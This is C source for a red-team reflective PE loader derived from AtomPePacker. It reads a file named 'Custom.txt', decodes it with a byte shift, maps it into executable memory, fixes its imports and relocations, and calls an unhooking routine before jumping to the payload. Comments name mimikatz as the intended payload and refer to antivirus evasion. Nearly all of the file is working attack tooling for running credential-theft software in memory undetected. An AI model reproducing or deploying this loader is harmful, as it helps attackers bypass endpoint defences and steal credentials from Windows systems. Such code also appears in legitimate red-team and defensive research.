//https://github.com/NUL0x4C/AtomPePacker
#include "header.h"
//#include "minidumpapiset.h"


#pragma comment (lib, "Dbghelp.lib")
#pragma comment (lib, "ntdll.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "Version.lib")




BOOL _InitPeStruct(PInPeConfig _Pe, PVOID pPeAddress, SIZE_T sPeSize) {
	if (pPeAddress == NULL || sPeSize == NULL) {
		return FALSE;
	}
	_Pe->pPeAddress = pPeAddress;
	_Pe->sPeSize = sPeSize;
	_Pe->pDosHdr = (PIMAGE_DOS_HEADER)pPeAddress;
	if (_Pe->pDosHdr->e_magic != IMAGE_DOS_SIGNATURE) {
		return FALSE;
	}

	


	_Pe->pNtHdr = (PIMAGE_NT_HEADERS)((PBYTE)pPeAddress + _Pe->pDosHdr->e_lfanew);
	if (_Pe->pNtHdr->Signature != IMAGE_NT_SIGNATURE) {
		return FALSE;
	}
	_Pe->pEIDataDir = &_Pe->pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
	_Pe->pTLSDataDir = &_Pe->pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];
	_Pe->pEBDataDir = &_Pe->pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
	_Pe->pEHDataDir = &_Pe->pNtHdr->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION];
	_Pe->pSecHdr = (PIMAGE_SECTION_HEADER)((SIZE_T)_Pe->pNtHdr + sizeof(IMAGE_NT_HEADERS));
	printf("BASE : %p\n", _Pe->pPeAddress);
	printf("Addr sec : %p\n", _Pe->pSecHdr);
	printf("Addr sec : %p\n", &_Pe->pSecHdr[6]);
	for (int i = 0; i < _Pe->pNtHdr->FileHeader.NumberOfSections; ++i) {
		printf("Section %d. PointerToRawData=%p. size=%d\n", i, _Pe->pSecHdr[i].PointerToRawData, _Pe->pSecHdr[i].SizeOfRawData);
	}
	if (_Pe->pDosHdr == NULL || _Pe->pNtHdr == NULL ||
		_Pe->pEIDataDir == NULL || _Pe->pTLSDataDir == NULL || _Pe->pEBDataDir == NULL || _Pe->pEHDataDir == NULL ||
		_Pe->pSecHdr == NULL
		) {
		return FALSE;
	}
	return TRUE;
}

BOOL _FixImportAddressTable(InPeConfig _Pe, ULONG_PTR pPeAddress) {

	PIMAGE_IMPORT_DESCRIPTOR	pImgDes = NULL;
	for (SIZE_T i = 0; i < _Pe.pEIDataDir->Size; i += sizeof(IMAGE_IMPORT_DESCRIPTOR)) {
		pImgDes = (IMAGE_IMPORT_DESCRIPTOR*)(_Pe.pEIDataDir->VirtualAddress + (ULONG_PTR)pPeAddress + i);
		if (pImgDes->OriginalFirstThunk == NULL && pImgDes->FirstThunk == NULL) {
			break;
		}
		LPSTR		DllName = (LPSTR)((ULONGLONG)pPeAddress + pImgDes->Name);
		ULONG_PTR	Head = pImgDes->FirstThunk;
		ULONG_PTR	Next = pImgDes->OriginalFirstThunk;
		SIZE_T		HeadSize = 0;
		SIZE_T		NextSize = 0;
		HMODULE		hModule = LoadLibraryA(DllName);
		if (hModule == NULL) {
			return FALSE;
		}
		if (Next == NULL) {
			Next = pImgDes->FirstThunk;
		}
		while (TRUE) {
			PIMAGE_THUNK_DATA			_1stThunk = (IMAGE_THUNK_DATA*)(pPeAddress + HeadSize + Head);
			PIMAGE_THUNK_DATA			Orig1stThunk = (IMAGE_THUNK_DATA*)(pPeAddress + NextSize + Next);
			PIMAGE_IMPORT_BY_NAME		FuncName = NULL;
			ULONG_PTR					pFunction = NULL;
			if (_1stThunk->u1.Function == NULL) {
				break;
			}
			if (Orig1stThunk->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
				PIMAGE_DOS_HEADER		_dos;
				PIMAGE_NT_HEADERS		_nt;
				PIMAGE_EXPORT_DIRECTORY	_ExportDir;
				PDWORD					_FuncAddArray;

				_dos = (PIMAGE_DOS_HEADER)hModule;
				_nt = (PIMAGE_NT_HEADERS)(((ULONG_PTR)hModule) + _dos->e_lfanew);
				_ExportDir = (PIMAGE_EXPORT_DIRECTORY)(((ULONG_PTR)hModule) + _nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
				_FuncAddArray = (PDWORD)((ULONG_PTR)hModule + _ExportDir->AddressOfFunctions);

				pFunction = ((ULONG_PTR)hModule + _FuncAddArray[Orig1stThunk->u1.Ordinal]);
				printf("Ordinal\n");
			}
			else {
				FuncName = (PIMAGE_IMPORT_BY_NAME)((SIZE_T)pPeAddress + Orig1stThunk->u1.AddressOfData);
				pFunction = (ULONG_PTR)GetProcAddress(hModule, FuncName->Name);
			}
			if (pFunction == NULL) {
				return FALSE;
			}
			_1stThunk->u1.Function = (ULONGLONG)pFunction;
			HeadSize += sizeof(IMAGE_THUNK_DATA);
			NextSize += sizeof(IMAGE_THUNK_DATA);
		}
	}
	return TRUE;
}

BOOL _ReallocationSupport(ULONG_PTR ActualAddress, ULONG_PTR PreferableAddress, PIMAGE_BASE_RELOCATION BaseRelocDir) {
	PIMAGE_BASE_RELOCATION  pImageBR = BaseRelocDir;
	ULONG_PTR				OffsetIB = ActualAddress - PreferableAddress;
	PBASE_RELOCATION_ENTRY	Reloc = NULL;
	
	while (pImageBR->VirtualAddress != 0) {
		Reloc = (PBASE_RELOCATION_ENTRY)(pImageBR + 1);
		
		while ((PBYTE)Reloc != (PBYTE)pImageBR + pImageBR->SizeOfBlock) {
			switch (Reloc->Type) {
			case IMAGE_REL_BASED_DIR64:
				*((ULONG_PTR*)(ActualAddress + pImageBR->VirtualAddress + Reloc->Offset)) += OffsetIB;
				break;
			case IMAGE_REL_BASED_HIGHLOW:
				*((DWORD*)(ActualAddress + pImageBR->VirtualAddress + Reloc->Offset)) += (DWORD)OffsetIB;
				break;
			case IMAGE_REL_BASED_HIGH:
				*((WORD*)(ActualAddress + pImageBR->VirtualAddress + Reloc->Offset)) += HIWORD(OffsetIB);
				break;
			case IMAGE_REL_BASED_LOW:
				*((WORD*)(ActualAddress + pImageBR->VirtualAddress + Reloc->Offset)) += LOWORD(OffsetIB);
				break;
			case IMAGE_REL_BASED_ABSOLUTE:
				break;
			default:
				return FALSE;
			}
			Reloc++;
		}
		pImageBR = (PIMAGE_BASE_RELOCATION)Reloc;
	}
	
	return TRUE;
}

PVOID UnpackAndRunEp(PVOID pPeAddress, SIZE_T sPeSize, BOOL RunPe) {
	
	InPeConfig				_Pe1 = { 0 };
	ULONG_PTR				pAddress = NULL;
	if (!_InitPeStruct(&_Pe1, pPeAddress, sPeSize)) {
		return;
	}
	pAddress = (unsigned char*)VirtualAlloc(NULL, _Pe1.pNtHdr->OptionalHeader.SizeOfImage, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (pAddress == NULL) {
		return;
	}
	
	memcpy(pAddress, pPeAddress, _Pe1.pNtHdr->OptionalHeader.SizeOfHeaders);	


	
	for (int i = 0; i < _Pe1.pNtHdr->FileHeader.NumberOfSections; i++) {
		memcpy(pAddress + _Pe1.pSecHdr[i].VirtualAddress, (ULONG_PTR)pPeAddress + _Pe1.pSecHdr[i].PointerToRawData, _Pe1.pSecHdr[i].SizeOfRawData);
	}
	
	if (!_FixImportAddressTable(_Pe1, pAddress)) {
		return;
	}
	
	if (pAddress != _Pe1.pNtHdr->OptionalHeader.ImageBase) {
		if (!_ReallocationSupport(pAddress, _Pe1.pNtHdr->OptionalHeader.ImageBase, (PIMAGE_BASE_RELOCATION)(pAddress + _Pe1.pEBDataDir->VirtualAddress))) {
			return;
		}
	}
	
	PVOID EP = (PVOID)(pAddress + _Pe1.pNtHdr->OptionalHeader.AddressOfEntryPoint);

	return EP;
	
}

unsigned char* get_file(unsigned char* filename, size_t* ret_size) {
	printf("in get_file\n");
	printf("file : %s\n", filename);

	FILE* file = fopen(filename, "rb");
	if (file == NULL) {
		return NULL;
	}
	fseek(file, 0, SEEK_END);
	long size = ftell(file);
	fseek(file, 0, SEEK_SET);
	printf("Allocated %d bytes\n", size);
	unsigned char* pe_mem = calloc(1, size);
	if (pe_mem == NULL)
	{
		printf("err pemem\n");
		exit(1);
	}
	fread(pe_mem, size, 1, file);
	printf("->%02X\n", pe_mem[0xec]);
	fclose(file);
	*ret_size = size;
	return pe_mem;
}



/*********************************************************************************************************************/





// exemple: mimikatz
int main(int argc, char *argv[]) {
	printf("Start 10s\n");
	//Sleep(10000);//if AV kill it at this stage, it perform static analysis on runtime

		//create_box();
		size_t len;
		//unsigned char* raw = get_file("C:\\Users\\sebastien.carre\\Downloads\\testrt\\REDTEAM_PE_Reflective\\x64\\Release\\simplelist.exe",&len);
		
		//unsigned char* raw = get_file("C:\\Windows\\System32\\calc.exe", &len);
		
		
		//unsigned char* raw = get_file("C:\\Users\\seb\\GIT\\REDTEAM_PE_Reflective\\x64\\Release\\Custom.txt", &len);
		unsigned char *raw = get_file("C:\\Users\\sebastien.carre\\whitelist\\GIT\\REDTEAM_PE_Reflective\\x64\\Release\\Custom.txt",&len);

		for (size_t i = 0; i < len; ++i) {
			raw[i] = raw[i] - 1;
		}
		 
		 
		

		PVOID EP = UnpackAndRunEp(raw, len, TRUE);
		main_unhook(0,NULL);
#if 1
		((VOID(*)())EP)();
		//main_mimikatz(0, NULL);

#endif
		printf("Press any key to continue");
		getchar();
	
	return 0;
}